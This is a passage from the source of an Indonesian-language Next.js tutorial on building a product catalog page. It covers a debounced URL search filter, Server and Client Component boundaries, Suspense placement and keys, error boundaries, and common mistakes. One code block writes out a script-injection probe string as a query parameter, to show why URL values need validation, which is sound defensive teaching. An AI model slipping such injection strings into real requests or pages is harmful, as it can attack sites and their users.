            if (ketikan === (params.get('q') ?? '')) return;

            const timer = setTimeout(() => {
              const baru = new URLSearchParams(params);
              if (ketikan) baru.set('q', ketikan);
              else baru.delete('q');
              baru.delete('halaman');       // reset halaman saat filter berubah

              const kueri = baru.toString();
              router.replace(kueri ? \`\${jalur}?\${kueri}\` : jalur, { scroll: false });
            }, 400);

            return () => clearTimeout(timer);
          }, [ketikan, params, router, jalur]);

          return (
            <input
              value={ketikan}
              onChange={(e) => setKetikan(e.currentTarget.value)}
              aria-label="Cari produk"
            />
          );
        }
        `,
        { filename: 'app/produk/PanelFilter.tsx' },
      ),
      p(
        "Baris `baru.delete('halaman')` menutup bug yang sangat sering. Kalau pengguna berada di halaman lima lalu mengetik kata pencarian, hasil barunya mungkin hanya punya satu halaman sehingga daftarnya kosong. Mereset halaman setiap kali filter berubah adalah aturan yang berlaku di hampir semua daftar berpaginasi.",
      ),
      p(
        'Pemakaian `router.replace` alih-alih `push` mencegah riwayat penuh saat pengguna mengetik. Digabung dengan penundaan empat ratus milidetik, satu kata pencarian menghasilkan satu entri riwayat bukan sepuluh. Opsi `scroll: false` mencegah halaman melompat ke atas pada tiap pembaruan, dan itu detail yang sangat terasa saat pengguna sedang menggulir hasil.',
      ),
      callout(
        'tip',
        'Setiap keputusan di halaman ini bisa disebutkan alasannya',
        'Halaman Server Component supaya pustaka berat tidak ikut ke peramban. Filter di alamat supaya bisa dibagikan. `PanelFilter` Client Component supaya ketikan terasa seketika. Dua Suspense terpisah supaya rekomendasi yang lambat tidak menahan hasil. Batas galat hanya di rekomendasi sebab hanya bagian itu yang boleh gagal. Kalau ada keputusan yang tidak bisa kamu sebutkan alasannya, itu tempat yang layak diperiksa ulang.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering saat seluruh materi bab ini dipakai bersamaan. Yang pertama dijalankan sungguhan dengan Next.js 16.2.12.',
      ),
      code(
        'text',
        `
        // 'use client' ditambahkan ke app/produk/page.tsx supaya bisa pakai useState

        You are attempting to export "metadata" from a component marked with
        "use client", which is disallowed.
        `,
        { caption: 'Dijalankan sungguhan. Satu penanda merusak tiga hal sekaligus.' },
      ),
      p(
        'Menambahkan penanda itu ke halaman merusak tiga hal sekaligus. Metadata ditolak sehingga buildnya gagal, pengambilan data pindah ke peramban sehingga pengguna melihat keadaan kosong, dan pustaka berat ikut ke bundel. Pisahkan bagian interaktifnya menjadi komponen kecil seperti `PanelFilter`, dan biarkan halamannya tetap Server Component.',
      ),
      code(
        'text',
        `
        export default async function HalamanKatalog({ searchParams }) {
          const { item } = await cariProduk(filter);      // di komponen halaman
          return (
            <Suspense fallback={<Skeleton />}>
              <Grid produk={item} />
            </Suspense>
          );
        }

        # Suspense tidak pernah aktif. Halaman kosong sampai datanya tiba.
        `,
        { caption: 'Data ditunggu di luar batas Suspense.' },
      ),
      p(
        'Ini kesalahan paling sering dan paling sulit dilihat, sebab `Suspense`-nya memang ada. Yang salah adalah letak `await`-nya. Aturannya, `await` harus berada di dalam komponen yang **dibungkus**, bukan di komponen yang membungkusnya. Kalau kamu menunggu datanya lalu mengirimkannya sebagai props, batasnya tidak akan pernah aktif.',
      ),
      code(
        'text',
        `
        <Suspense fallback={<SkeletonGrid />}>      // tanpa key
          <HasilProduk filter={filter} />
        </Suspense>

        # Pengguna mengganti filter. Daftar lama tetap tampil
        # sampai hasil baru tiba, tanpa satu pun tanda.
        `,
        { caption: 'Batas Suspense dipakai ulang untuk filter yang berbeda.' },
      ),
      p(
        'Tidak ada error, dan yang rusak adalah pengalamannya. Pengguna mengetik lalu tidak melihat apa pun berubah selama beberapa ratus milidetik, sehingga ia mengetik lagi atau mengira pencariannya tidak bekerja. Prop `key` yang berubah mengikuti filter memaksa React memperlakukannya sebagai batas baru sehingga fallbacknya tampil lagi.',
      ),
      code(
        'text',
        `
        # Alamat: /produk?kategori=<script>alert(1)</script>&halaman=abc

        # Tanpa validasi:
        # - kategori masuk ke kueri database apa adanya
        # - Number('abc') = NaN, dan Math.max(1, NaN) = NaN
        # - offset menjadi NaN, dan daftarnya kosong
        `,
        { caption: 'Nilai dari alamat dipakai tanpa diperiksa.' },
      ),
      p(
        'Alamat halaman adalah masukan dari luar, dan aturan `security.md` berlaku penuh. Nilai `NaN` pada nomor halaman menghasilkan daftar kosong tanpa error, dan nilai kategori yang tidak divalidasi masuk ke kueri. Cocokkan terhadap daftar yang sah, batasi panjangnya, dan pastikan angkanya benar-benar angka. Ketiganya beberapa baris dan menutup kelas masalah yang tidak berbunyi.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`attempting to export "metadata" from a component marked with "use client"`',
            'Penanda klien ditambahkan ke halaman',
            'Pisahkan bagian interaktifnya menjadi komponen kecil',
          ],
          [
            'Suspense dipasang dan halaman tetap kosong',
            '`await` berada di luar batasnya',
            'Pindahkan pengambilan data ke dalam komponen yang dibungkus',
          ],
          [
            'Daftar lama tetap tampil saat filter diganti',
            'Batas Suspense dipakai ulang',
            'Beri `key` yang berubah mengikuti filter',
          ],
          [
            'Daftar kosong untuk nomor halaman yang tidak wajar',
            "`Number(\\'abc\\')` menghasilkan `NaN`",
            'Tangkap dengan `|| 1`, lalu batasi dengan `Math.max`',
          ],
          [
            'Riwayat penuh saat mengetik',
            'Alamat diperbarui tiap huruf dengan `push`',
            'Tunda dengan debounce, dan pakai `replace`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Praktik penutup bab ini menggabungkan seluruh materi, dan kesalahan yang muncul hampir selalu berupa satu keputusan yang diambil tanpa alasan.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menambahkan `use client` ke halaman supaya bisa pakai hook',
            'Errornya hilang',
            'Metadata ditolak, pengambilan data pindah ke peramban, dan pustaka berat ikut ke bundel',
          ],
          [
            'Menunggu seluruh data di komponen halaman',
            'Terbaca rapi dari atas ke bawah',
            'Batas Suspense tidak pernah aktif, dan seluruh halaman menunggu yang terlambat',
          ],
          [
            'Menyimpan filter di `useState`',
            'Itu kan state',
            'Tautan tidak bisa dibagikan, muat ulang mengosongkan pilihan, dan tombol kembali tidak bekerja',
          ],
          [
            'Memercayai nilai dari `searchParams`',
            'Kita sendiri yang menulis alamatnya',
            'Siapa pun bisa mengetik apa saja. Validasi seperti data dari server',
          ],
          [
            'Membungkus seluruh halaman dengan satu batas galat',
            'Semua kegagalan tertangkap',
            'Rekomendasi yang gagal menjatuhkan halaman yang sembilan puluh persennya masih berguna',
          ],
          [
            'Tidak menguji dengan `next build` lalu `next start`',
            'Di pengembangan sudah jalan',
            'Cache, metadata, dan ukuran bundel semuanya berperilaku berbeda di mode produksi',
          ],
        ],
      ),
      p(
        'Baris terakhir adalah kebiasaan yang menangkap sebagian besar masalah di sub-bab ini dalam lima menit. Jalankan `next build`, baca tabel rutenya, lalu jalankan `next start` dan buka halamannya dengan pembatas jaringan aktif. Periksa View Source untuk memastikan isinya benar-benar dari server, salin alamatnya ke tab baru untuk memastikan filternya terbawa, dan matikan satu layanan untuk memastikan batas galatnya bekerja.',
      ),
      callout(
        'info',
        'Yang kamu bawa dari bab ini ke kategori berikutnya',
        'Server Component adalah bawaan, dan `use client` adalah batas yang diletakkan sedekat mungkin ke bagian interaktif. Pengambilan data di server menghilangkan satu perjalanan bolak-balik. Cache diputuskan per halaman berdasarkan seberapa cepat datanya berubah. Server Action tetap endpoint publik yang wajib diperiksa izinnya. Dan keluaran `next build` adalah dokumentasi yang paling akurat tentang apa yang benar-benar terjadi.',
      ),
      references(
        {
          label: 'Dynamic Routes & generateStaticParams',
          href: 'https://nextjs.org/docs/app/api-reference/functions/generate-static-params',
          source: 'Next.js',
          note: 'Langkah 1–2 — rute dinamis dengan `params` async dan pembuatan seluruh halaman saat build.',
        },
        {
          label: 'generateMetadata',
          href: 'https://nextjs.org/docs/app/api-reference/functions/generate-metadata',
          source: 'Next.js',
          note: 'Langkah 3 — judul dan deskripsi per pelajaran.',
        },
        {
          label: 'useSyncExternalStore',
          href: 'https://react.dev/reference/react/useSyncExternalStore',
          source: 'React',
          note: 'Langkah 6 — snapshot server yang wajib ada agar hidrasi tidak berbeda.',
        },
        {
          label: 'Production Checklist',
          href: 'https://nextjs.org/docs/app/guides/production-checklist',
          source: 'Next.js',
          note: 'Langkah 8 — daftar hal yang harus diverifikasi, bukan diasumsikan.',
        },
      ),
    ],
  ),
];
